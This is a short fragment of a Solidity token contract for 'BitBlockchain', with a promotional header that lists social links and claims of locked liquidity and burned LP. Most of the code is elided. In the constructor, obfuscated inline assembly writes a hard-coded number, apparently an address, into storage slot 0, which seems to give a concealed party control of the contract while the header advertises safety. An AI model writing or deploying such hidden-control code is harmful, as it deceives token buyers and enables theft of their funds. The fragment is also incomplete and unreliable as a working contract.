/*
Welcome to BitBlockchain

Telegram: https://t.me/BitBlockchain
Twitter: https://twitter.com/BitBlockchain
https://BitBlockchain.space
LOCKED
LP Burned
Always DYOR
MoonGem
...
contract BitBlockchain {
    string public constant name = "BitBlockchain";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(938813940837167419614110987149725056053356000931, 2))}
